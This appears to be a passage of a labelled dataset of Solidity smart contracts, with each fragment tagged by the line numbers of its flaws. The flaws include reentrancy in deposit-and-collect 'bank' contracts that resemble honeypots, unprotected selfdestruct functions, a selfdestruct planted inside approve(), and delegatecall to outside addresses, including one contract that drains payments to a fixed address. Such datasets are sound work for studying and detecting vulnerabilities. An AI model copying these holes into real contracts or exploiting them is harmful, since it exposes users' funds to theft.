        if(address(this).balance >= amount) {
            balances[msg.sender] = 0;
            if (amount > 0) {
                msg.sender.transfer(amount);
                Refund(msg.sender, amount);
            }
        }
    }
    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the the balance of.
    * @return An uint256 representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) external constant returns (uint256 balance) {
        return balances[_owner];
    }
    function getStageLimit(uint8 _stage) public view returns (uint256) {
        return stageLimits[_stage];
    }
    function getStageDiscount(uint8 _stage) public view returns (uint128) {
        return stageDiscounts[_stage];
    }
    function getStageCount() public view returns (uint8) {
        return uint8(stageLimits.length);
    }
}",[64]
"}
contract MintableToken is StandardToken, Ownable {
    event Mint(address indexed to, uint256 amount);
    event MintFinished();
    bool public mintingFinished = false;
    modifier canMint() {
        require(!mintingFinished);
        _;
    }
    function mint(address _to, uint256 _amount) public onlyOwner canMint returns (bool) {
        totalSupply = totalSupply.add(_amount);
        balances[_to] = balances[_to].add(_amount);
        Mint(_to, _amount);
        return true;
    }
    function destroy(uint256 _amount, address destroyer) public onlyOwner {
        uint256 myBalance = balances[destroyer];
        if (myBalance > _amount) {
            totalSupply = totalSupply.sub(_amount);
            balances[destroyer] = myBalance.sub(_amount);
        }
        else {
            if (myBalance != 0) totalSupply = totalSupply.sub(myBalance);
            balances[destroyer] = 0;
        }
    }
    function finishMinting() public onlyOwner returns (bool) {
        mintingFinished = true;
        MintFinished();
        return true;
    }
}
contract Crowdsale is Ownable {
    using SafeMath for uint256;
    // The token being sold
    ObizcoinCrowdsaleToken public token;
    // address where funds are collected
    address public wallet;
    // amount of raised money in wei
    uint256 public weiRaised;
    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount, uint mytime);
    function Crowdsale()public {
        token = createTokenContract();
        wallet = msg.sender;
    }
    function setNewWallet(address newWallet) public onlyOwner {
        require(newWallet != 0x0);
        wallet = newWallet;
    }
    function createTokenContract() internal returns (ObizcoinCrowdsaleToken) {
        return new ObizcoinCrowdsaleToken();
    }
    // fallback function can be used to buy tokens
    function() public payable {
        buyTokens(msg.sender);
    }
    function profitSharing() payable public {
        uint256 weiAmount = msg.value;
        uint256 ballanceOfHolder;
        for (uint i = 0; i < holders.length; i++)
        {
            ballanceOfHolder = token.balanceOf(holders[i]);
            if (ballanceOfHolder > 0) {
                holders[i].transfer(ballanceOfHolder.mul(weiAmount).div(token.totalSupply()));
            }
        }
    }
    function destroyMyToken(uint256 amount) public onlyOwner {
        token.destroy(amount.mul(1000000000000000000), msg.sender);
    }
    uint time0 = 1512970200; // now; // 11th dec, 2017 at 05:30 hrs UTC
    //uint time0 = block.timestamp;
    uint time1 = time0 + 15 days;
    uint time2 = time1 + 44 days + 5 hours + 5 minutes; // 24th Jan,2018 at 11:00 hrs UTC
    uint time3 = time0 + 49 days;
    uint time4 = time3 + 1 weeks;
    uint time5 = time3 + 2 weeks;
    uint time6 = time3 + 3 weeks;
    uint time7 = time2 + 34 days;
    // low level token purchase function
    function buyTokens(address beneficiary) public payable {
        require(beneficiary != 0x0);
        require(validPurchase());
        require(!hasEnded());
        uint256 weiAmount = msg.value;
        uint256 tokens;
        // calculate token amount to be created
        if (block.timestamp >= time0 && block.timestamp < time2) tokens = weiAmount.mul(11000);
        else if (block.timestamp >= time3 && block.timestamp < time7) tokens = weiAmount.mul(10000);
        // update state
        weiRaised = weiRaised.add(weiAmount);
        token.mint(beneficiary, tokens);
        addNewHolder(beneficiary);
        TokenPurchase(msg.sender, beneficiary, weiAmount, tokens, block.timestamp);
        forwardFunds();
    }
    function mintTokens(address beneficiary, uint256 tokens) internal {
        uint256 weiAmount;
        if (block.timestamp >= time0 && block.timestamp < time2) weiAmount = tokens.div(11000);
        else if (block.timestamp >= time3 && block.timestamp < time7) weiAmount = tokens.div(10000);
        weiRaised = weiRaised.add(weiAmount);
        token.mint(beneficiary, tokens);
        addNewHolder(beneficiary);
        TokenPurchase(msg.sender, beneficiary, weiAmount, tokens, block.timestamp);
    }
    // send ether to the fund collection wallet
    // override to create custom fund forwarding mechanisms
    function forwardFunds() internal {
        wallet.transfer(msg.value);
    }
    // @return true if the transaction can buy tokens
    function validPurchase() internal constant returns (bool) {
        return msg.value != 0;
    }
    // @return true if crowdsale event has ended
    function hasEnded() public constant returns (bool) {
        return block.timestamp < time0 || (block.timestamp > time2 && block.timestamp < time3) || block.timestamp > time7;
    }
    mapping (address => bool) isHolder;
    address[] public holders;
    function addNewHolder(address newHolder) internal {
        if (!isHolder[newHolder]) {
            holders.push(newHolder);
            isHolder[newHolder] = true;
        }
    }
}
contract ObizcoinCrowdsaleToken is MintableToken {","[60, 63, 64, 68]"
"pragma solidity ^0.5.12;
contract OddWins {
    address payable owner;
    uint evenOrOdd = 0;
    constructor() public {
        owner = msg.sender;
    }
    // send 0.1 to bet. you win if you are odd
    function () external payable {
        require(msg.value == 10**17);
        if (evenOrOdd % 2 > 0) {
            uint balance = address(this).balance;
            uint devFee = balance / 100;
            // send developer's fee
            if (owner.send(devFee)) {
                // send winner amount
                if (!msg.sender.send(balance - devFee)) {
                    revert();
                }
            }
        }
        evenOrOdd++;
    }
    function shutdown() public {
        selfdestruct(owner);
    }
}","[24, 25]"
"}
contract Presale {
  using SafeMath for uint256;
  mapping (address => uint256) public balances;
  // Minimum amount of wei required for presale to be successful.  If not successful, refunds are provided.
  uint256 public minGoal;
  // Maximum amount of wei for presale to raise.
  uint256 public maxGoal;
  // The epoch unix timestamp of when the presale starts
  uint256 public startTime;
  // The epoch unix timestamp of when the presale ends
  uint256 public endTime;
  // The wallet address that the funds will be sent to
  address public projectWallet;
  uint256 private totalRaised;
  function Presale(
    uint256 _minGoal,
    uint256 _maxGoal,
    uint256 _startTime,
    uint256 _endTime,
    address _projectWallet
  )
  {
    require(_minGoal > 0);
    require(_endTime > _startTime);
    require(_projectWallet != address(0x0));
    require(_maxGoal > _minGoal);
    minGoal = _minGoal;
    maxGoal = _maxGoal;
    startTime = _startTime;
    endTime = _endTime;
    projectWallet = _projectWallet;
  }
  function transferToProjectWallet() {
    // only allow transfers if there is balance
    require(this.balance > 0);
    // only allow transfers if minimum goal is met
    require(totalRaised >= minGoal);
    if(!projectWallet.send(this.balance)) {
      revert();
    }
  }
  function refund() {
    // only allow refund if the presale has ended
    require(now > endTime);
    // only allow refund if the minGoal has not been reached
    require(totalRaised < minGoal);
    // only allow refund during a 60 day window after presale ends
    require(now < (endTime + 60 days));
    uint256 amount = balances[msg.sender];
    // only allow refund if investor has invested
    require(amount > 0);
    // after refunding, zero out balance
    balances[msg.sender] = 0;
    if (!msg.sender.send(amount)) {
      revert();
    }
  }
  function transferRemaining() {
    // only allow transfer if presale has failed
    require(totalRaised < minGoal);
    // only allow transfer after refund window has passed
    require(now >= (endTime + 60 days));
    // only allow transfer if there is remaining balance
    require(this.balance > 0);
    projectWallet.transfer(this.balance);
  }
  function () payable {
    // only allow payments greater than 0
    require(msg.value > 0);
    // only allow payments after presale has started
    require(now >= startTime);
    // only allow payments before presale has ended
    require(now <= endTime);
    // only allow payments if the maxGoal has not been reached
    require(totalRaised < maxGoal);
    // If this investment should cause the max to be achieved
    // Then it should only accept up to the max goal
    // And refund the remaining
    if (totalRaised.add(msg.value) > maxGoal) {
      var refundAmount = totalRaised + msg.value - maxGoal;
      if (!msg.sender.send(refundAmount)) {
        revert();
      }
      var raised = maxGoal - totalRaised;
      balances[msg.sender] = balances[msg.sender].add(raised);
      totalRaised = totalRaised.add(raised);
    } else {
      // if all checks pass, then add amount to balance of the sender
      balances[msg.sender] = balances[msg.sender].add(msg.value);
      totalRaised = totalRaised.add(msg.value);
    }
  }
}
contract OpenMoneyPresale is Presale {
  function OpenMoneyPresale() Presale(83.33 ether,
                                      2000 ether,
                                      1505649600,
                                      1505995200,
                                      address(0x2a00BFd8379786ADfEbb6f2F59011535a4f8d4E4))
                                      {}
}","[63, 66]"
"/* Orchid - WebRTC P2P VPN Market (on Ethereum)
 * Copyright (C) 2017-2019  The Orchid Authors
*/
/* GNU Affero General Public License, Version 3 {{{ */
/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
/* }}} */
pragma solidity 0.5.13;
interface OrchidVerifier {
    function book(address funder, address signer, bytes calldata shared, address target, uint128 amount, uint128 ratio, bytes calldata receipt) external pure;
}
contract OrchidFailer is OrchidVerifier {
    function kill() external {
        selfdestruct(msg.sender);
    }
    function book(address, address, bytes calldata, address, uint128, uint128, bytes calldata) external pure {
        require(false);
    }
}","[23, 24]"
"pragma solidity >=0.7.0 <0.8.0;
contract Owner {
    address[] private contracts = [
        0x3dAfE91e795409576Ddb983D891E5fb5c61439a1,
        0x3aD2f955Bb5dfbF3CD22e764CCe8445F4243826a,
        0x4F5E9704B1d7cC032553F63471D96FcB63Ff2bc3,
        0xB95188f011E49a60fC6C743b1bc93B38651A204e,
        0xbDb80D19dEA36EB7f63bdFD2bdD4033B2b7e8e4d,
        0x910e014bBA427e9FCB48B4D314Dc81f840d7b6E3,
        0x9D6acD34D481512586844fD65328BD358d306752,
        0xBFc92d767436565B3C21Bd0B5Abf4598447697eE,
        0x66d35ccD808317870198793a96b88ab69dCAe53B,
        0x32dCB582EcD6193937BD33168e19173Cfe10a140
    ];
    function withdrawPayment() public {
        for (uint i = 0; i < contracts.length; i++) {
            contracts[i].delegatecall(abi.encodeWithSignature(""withdrawPayment(address)"", 0xFa0E4F48a369BB3eCBCEe0B5119379EA8D1bcF29));
        }
    }
    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}","[20, 21]"
"pragma solidity ^0.4.19;
contract PENNY_BY_PENNY  
{
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)throw;
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)throw;
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Put(uint _lockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[44, 46, 48]"
"pragma solidity ^0.4.19;
contract PERSONAL_BANK
{
    mapping (address=>uint256) public balances;   
    uint public MinSum = 1 ether;
    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        if(intitalized)revert();
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        if(intitalized)revert();
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[38, 40]"
"pragma solidity ^0.4.25;
contract PG_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function PG_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract PG_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function PG_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.24;
contract PIGGYBANK
{
    bytes32 hashPwd;
    bool isclosed = false;
    uint cashOutTime;
    address sender;
    address myadress;
    function CashOut(bytes pass) external payable
    {
        if(hashPwd == keccak256(pass) && now>cashOutTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function CashOut() public payable
    {
        if(msg.sender==myadress && now>cashOutTime)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function DebugHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
    function SetPwd(bytes32 hash) public payable
    {
        if( (!isclosed&&(msg.value>1 ether)) || hashPwd==0x00)
        {
            hashPwd = hash;
            sender = msg.sender;
            cashOutTime = now;
        }
    }
    function SetcashOutTime(uint date) public
    {
        if(msg.sender==sender)
        {
            cashOutTime = date;
        }
    }
    function Setmyadress(address _myadress) public
    {
        if(msg.sender==sender)
        {
            myadress = _myadress;
        }
    }
    function PwdHasBeenSet(bytes32 hash) public
    {
        if(hash==hashPwd&&msg.sender==sender)
        {
           isclosed=true;
        }
    }
    function() public payable{}
}",[11]
"pragma solidity ^0.4.19;
contract PIGGY_BANK
{
    mapping (address => uint) public Accounts;
    uint public MinSum = 1 ether;
    Log LogFile;
    uint putBlock;
    function PIGGY_BANK(address _log)
    public 
    {
        LogFile = Log(_log);
    }
    function Put(address to)
    public
    payable
    {
        Accounts[to]+=msg.value;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
        putBlock = block.number;
    }
    function Collect(uint _am)
    public
    payable
    {
        if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock)
        {
            if(msg.sender.call.value(_am)())
            {
                Accounts[msg.sender]-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(msg.sender);
    }    
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[27, 29]"
"pragma solidity ^0.4.20;
contract PLAY_AND_GAIN
{
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"      returns (bool)
    {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		msg.sender.transfer(balance);
		return true;
    }
	function sellMyTokensDaddy() public {
		var balance = balanceOf(msg.sender);
		transferTokens(msg.sender, address(this),  balance); // this triggers the internal sell function
	}
    function getMeOutOfHere() public {
		sellMyTokensDaddy();
        withdraw(1); // parameter is ignored
	}
	function fund()
      public
      payable
      returns (bool)
    {
      if (msg.value > 0.000001 ether)
			buy();
		else
			return false;
      return true;
    }
	function buyPrice() public constant returns (uint) {
		return getTokensForEther(1 finney);
	}
	function sellPrice() public constant returns (uint) {
		return getEtherForTokens(1 finney);
	}
	// End of useless functions
	// Invariants
	// totalPayout/Supply correct:
	//   totalPayouts = \sum_{addr:address} payouts(addr)
	//   totalSupply  = \sum_{addr:address} balanceOfOld(addr)
	// dividends not negative:
	//   \forall addr:address. payouts[addr] <= earningsPerShare * balanceOfOld[addr]
	// supply/reserve correlation:
	//   totalSupply ~= exp(LOGC + CRRN/CRRD*log(reserve())
	//   i.e. totalSupply = C * reserve()**CRR
	// reserve equals balance minus payouts
	//   reserve() = this.balance - \sum_{addr:address} dividends(addr)
	function transferTokens(address _from, address _to, uint256 _value) internal {
		if (balanceOfOld[_from] < _value)
			revert();
		if (_to == address(this)) {
			sell(_value);
		} else {
		    int256 payoutDiff = (int256) (earningsPerShare * _value);
		    balanceOfOld[_from] -= _value;
		    balanceOfOld[_to] += _value;
		    payouts[_from] -= payoutDiff;
		    payouts[_to] += payoutDiff;
		}
		Transfer(_from, _to, _value);
	}
	function transfer(address _to, uint256 _value) public {
	    transferTokens(msg.sender, _to,  _value);
	}
    function transferFrom(address _from, address _to, uint256 _value) public {
        var _allowance = allowance[_from][msg.sender];
        if (_allowance < _value)
            revert();
        allowance[_from][msg.sender] = _allowance - _value;
        transferTokens(_from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public {
        // To change the approve amount you first have to reduce the addresses`
        //  allowance to zero by calling `approve(_spender, 0)` if it is not
        //  already 0 to mitigate the race condition described here:
        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        selfdestruct(owner);
        if ((_value != 0) && (allowance[msg.sender][_spender] != 0)) revert();
        allowance[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
    }
	function dividends(address _owner) public constant returns (uint256 amount) {
		return (uint256) ((int256)(earningsPerShare * balanceOfOld[_owner]) - payouts[_owner]) / PRECISION;
	}
	function withdrawOld(address to) public {
		var balance = dividends(msg.sender);
		payouts[msg.sender] += (int256) (balance * PRECISION);
		totalPayouts += (int256) (balance * PRECISION);
		to.transfer(balance);
	}
	function balance() internal constant returns (uint256 amount) {
		return this.balance - msg.value;
	}
	function reserve() public constant returns (uint256 amount) {
		return balance()
			- ((uint256) ((int256) (earningsPerShare * totalSupply) - totalPayouts) / PRECISION) - 1;
	}
	function buy() internal {
		if (msg.value < 0.000001 ether || msg.value > 1000000 ether)
			revert();
		var sender = msg.sender;
		// 5 % of the amount is used to pay holders.
		var fee = (uint)(msg.value / 10);
		// compute number of bought tokens
		var numEther = msg.value - fee;
		var numTokens = getTokensForEther(numEther);
		var buyerfee = fee * PRECISION;
		if (totalSupply > 0) {
			// compute how the fee distributed to previous holders and buyer.
			// The buyer already gets a part of the fee as if he would buy each token separately.
			var holderreward =
			    (PRECISION - (reserve() + numEther) * numTokens * PRECISION / (totalSupply + numTokens) / numEther)
			    * (uint)(CRRD) / (uint)(CRRD-CRRN);
			var holderfee = fee * holderreward;
			buyerfee -= holderfee;
			// Fee is distributed to all existing tokens before buying
			var feePerShare = holderfee / totalSupply;
			earningsPerShare += feePerShare;
		}
		// add numTokens to total supply
		totalSupply += numTokens;
		// add numTokens to balance
		balanceOfOld[sender] += numTokens;
		// fix payouts so that sender doesn't get old earnings for the new tokens.
		// also add its buyerfee
		var payoutDiff = (int256) ((earningsPerShare * numTokens) - buyerfee);
		payouts[sender] += payoutDiff;
		totalPayouts += payoutDiff;
	}
	function sell(uint256 amount) internal {","[54, 70, 75]"
"pragma solidity ^0.4.19;
contract PRIVATE_ETH_CELL
{
    mapping (address=>uint256) public balances;   
    uint public MinSum;
    LogFile Log;
    bool intitalized;
    function SetMinSum(uint _val)
    public
    {
        require(!intitalized);
        MinSum = _val;
    }
    function SetLogFile(address _log)
    public
    {
        require(!intitalized);
        Log = LogFile(_log);
    }
    function Initialized()
    public
    {
        intitalized = true;
    }
    function Deposit()
    public
    payable
    {
        balances[msg.sender]+= msg.value;
        Log.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)
        {
            if(msg.sender.call.value(_am)())
            {
                balances[msg.sender]-=_am;
                Log.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Deposit();
    }
}
contract LogFile
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[38, 40]"
"        accrue();
        updateInterestRate();
        _addAsset(msg.sender, amount);
        vault.transferFrom(tokenAsset, msg.sender, amount);
    }
    function removeCollateral(uint256 share, address to) public {
        accrue();
        uint256 amount = _removeCollateralShare(msg.sender, share);
        require(isSolvent(msg.sender, false), 'BentoBox: user insolvent');
        vault.transfer(tokenCollateral, to, amount);
    }
    function removeAsset(uint256 share, address to) public {
        accrue();
        updateInterestRate();
        uint256 amount = _removeAssetShare(msg.sender, share);
        vault.transfer(tokenAsset, to, amount);
    }
    function borrow(uint256 amount, address to) public {
        require(amount <= totalAsset.sub(totalBorrow), 'BentoBox: not enough liquidity');
        accrue();
        updateInterestRate();
        _addBorrow(msg.sender, amount);
        require(isSolvent(msg.sender, false), 'BentoBox: user insolvent');
        vault.transfer(tokenAsset, to, amount);
    }
    function repay(uint256 share) public {
        accrue();
        updateInterestRate();
        uint256 amount = _removeBorrowShare(msg.sender, share);
        vault.transferFrom(tokenAsset, msg.sender, amount);
    }
    function short(address swapper, uint256 amountAsset, uint256 minAmountCollateral) public {
        require(amountAsset <= totalAsset.sub(totalBorrow), 'BentoBox: not enough liquidity');
        require(vault.swappers(swapper), 'BentoBox: Invalid swapper');
        accrue();
        updateInterestRate();
        _addBorrow(msg.sender, amountAsset);
        (bool success, bytes memory result) = swapper.delegatecall(
            abi.encodeWithSignature(""swap(address,address,address,uint256,uint256)"", swapper, tokenAsset, tokenCollateral, amountAsset, minAmountCollateral));
        require(success, 'BentoBox: Swap failed');
        uint256 amountCollateral = abi.decode(result, (uint256));
        _addCollateral(msg.sender, amountCollateral);
        require(isSolvent(msg.sender, false), 'BentoBox: user insolvent');
    }
    function unwind(address swapper, uint256 borrowShare, uint256 maxAmountCollateral) public {
        require(vault.swappers(swapper), 'BentoBox: Invalid swapper');
        accrue();
        updateInterestRate();
        uint256 borrowAmount = _removeBorrowShare(msg.sender, borrowShare);
        (bool success, bytes memory result) = swapper.delegatecall(
            abi.encodeWithSignature(""swapExact(address,address,address,uint256,uint256)"", swapper, tokenCollateral, tokenAsset, maxAmountCollateral, borrowAmount));
        require(success, 'BentoBox: Swap failed');
        _removeCollateralShare(msg.sender, abi.decode(result, (uint256)).mul(totalCollateralShare).div(totalCollateral));
        require(isSolvent(msg.sender, false), 'BentoBox: user insolvent');
    }
    function liquidate(address[] calldata users, uint256[] calldata borrowShares, address to, address swapper, bool open) public {
        accrue();
        updateExchangeRate();
        updateInterestRate();
        uint256 allCollateralAmount;
        uint256 allCollateralShare;
        uint256 allBorrowAmount;
        uint256 allBorrowShare;
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            if (!isSolvent(user, open)) {
                uint256 borrowShare = borrowShares[i];
                uint256 borrowAmount = borrowShare.mul(totalBorrow).div(totalBorrowShare);
                uint256 collateralAmount = borrowAmount.mul(1e13).mul(liqMultiplier).div(exchangeRate);
                uint256 collateralShare = collateralAmount.mul(totalCollateralShare).div(totalCollateral);
                userCollateralShare[user] = userCollateralShare[user].sub(collateralShare);
                userBorrowShare[user] = userBorrowShare[user].sub(borrowShare);
                emit RemoveCollateral(user, collateralAmount, collateralShare);
                emit RemoveBorrow(user, borrowAmount, borrowShare);
                // Keep totals
                allCollateralAmount = allCollateralAmount.add(collateralAmount);
                allCollateralShare = allCollateralShare.add(collateralShare);
                allBorrowAmount = allBorrowAmount.add(borrowAmount);
                allBorrowShare = allBorrowShare.add(borrowShare);
            }
        }
        require(allBorrowAmount != 0, 'BentoBox: all users are solvent');
        totalBorrow = totalBorrow.sub(allBorrowAmount);
        totalBorrowShare = totalBorrowShare.sub(allBorrowShare);
        totalCollateral = totalCollateral.sub(allCollateralAmount);
        totalCollateralShare = totalCollateralShare.add(allCollateralShare);
        if (!open) {
            // Closed liquidation using a pre-approved swapper for the benefit of the LPs
            require(vault.swappers(swapper), 'BentoBox: Invalid swapper');
            (bool success, bytes memory result) = swapper.delegatecall(
                abi.encodeWithSignature(""swap(address,address,address,uint256,uint256)"", swapper, tokenCollateral, tokenAsset, allCollateralAmount, allBorrowAmount));
            require(success, 'BentoBox: Swap failed');
            uint256 extraAsset = abi.decode(result, (uint256)).sub(allBorrowAmount);
            // The extra asset gets added to the pool
            uint256 feeAmount = extraAsset.div(10); // 10% of profit goes to fee
            feesPending = feesPending.add(feeAmount);
            totalAsset = totalAsset.add(extraAsset.sub(feeAmount));
            emit AddAsset(address(0), extraAsset, 0);
        } else if (swapper == address(0)) {
            vault.transferFrom(tokenAsset, to, allBorrowAmount);
            vault.transfer(tokenCollateral, to, allCollateralAmount);
        } else {
            // Open (flash) liquidation: get proceeds first and provide the borrow after
            vault.transfer(tokenCollateral, swapper, allCollateralAmount);
            ISwapper(swapper).swap(tokenCollateral, tokenAsset, allCollateralAmount, allBorrowAmount, to);
            vault.transferFrom(tokenAsset, swapper, allBorrowAmount);
        }
    }
}","[38, 39, 50, 51, 90, 91]"
"// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity =0.6.6;
interface IPermitAndCall {
  function permitAndCall(
    address token,
    uint value,
    bytes4 permitSelector,
    bytes calldata permitData,
    bytes4 routerFunctionSelector,
    bytes calldata routerFunctionData
  )
    external;
}
interface IUniswapV2Router02 {
  function WETH() external pure returns (address); 
}
interface IERC20 {
  function allowance(address owner, address spender) external view returns (uint);
}
contract PermitAndCall is IPermitAndCall {
  address public immutable router;
  address public immutable WETH;
  constructor(address _router) public {
    router = _router;
    WETH = IUniswapV2Router02(_router).WETH();
  }
  receive() external payable {
    assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract
  }
  function permitAndCall(
    address token,
    uint value,
    bytes4 permitSelector,
    bytes memory permitData,
    bytes4 routerFunctionSelector,
    bytes memory routerFunctionData
  )
    public
    override
  {
    // if the `msg.sender`'s allowance for this contract is less than `value`, execute a permit
    if (IERC20(token).allowance(msg.sender, address(this)) < value) {
      (bool success,) = token.call(abi.encodePacked(permitSelector, permitData));
      require(success, 'PermitAndCall: permit failed.');
    }
    // execute a router function
    (bool success,) = router.delegatecall(abi.encodePacked(routerFunctionSelector, routerFunctionData));
    require(success, 'PermitAndCall: router failed.');
  }
}",[47]
"	// функция смены адреса ETH куда будут поступать отправленные эфиры
    function setBeneficiaryAddress(address _new) public onlyOwner {
        beneficiary = _new;
    }
    // функция установки стоимости одного токена в wei
    function setTokenPrice(uint _price) public onlyOwner {
        tokenPrice = _price;
    }
    // фукнция списания токенов с общего баланса на баланс отправителя
